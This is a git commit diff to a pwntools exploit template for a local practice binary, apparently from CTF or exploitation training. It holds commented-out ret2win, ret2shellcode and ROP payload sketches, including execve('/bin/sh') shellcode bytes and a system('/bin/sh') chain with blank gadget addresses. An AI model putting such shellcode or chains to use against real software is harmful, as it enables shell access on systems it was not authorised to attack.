b100db2192757ea0d1d4ecd244b6befef8fb4554
farmansk <shkfrmn786@gmail.com>
2023-07-26 01:55:21 +0530

    rop1

--- template.py
+++ template.py
@@ -10,6 +10,8 @@ elf = context.binary = ELF('./noob/noobpwn1', checksec=True)
 # Enable verbose logging so we can see exactly what is being sent (info/debug)
 # context.log_level = 'debug'
 
+context.terminal = ['tmux', 'splitw', '-h']
+
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
@@ -66,11 +68,23 @@ continue
 
 io = start()
 
-offset = find_ip(cyclic(128))
-payload = flat(
-    b'A' * offset,
-    elf.symbols.win
-)
+#ret2win
+# offset = find_ip(cyclic(128))
+# payload = flat(
+#     b'A' * offset,
+#     elf.symbols.win
+# )
+
+#ret2shellcode
+# shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
+# payload = shellcode + cyclic(16) + pack(shellcodevar_address)
+
+#rop
+# pop_rdi = 
+# bin_sh = 
+# ret = 
+# system = elf.sym.system
+# payload = cyclic(40) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(system)
 
 io.sendlineafter(b'?', payload)
 io.interactive()
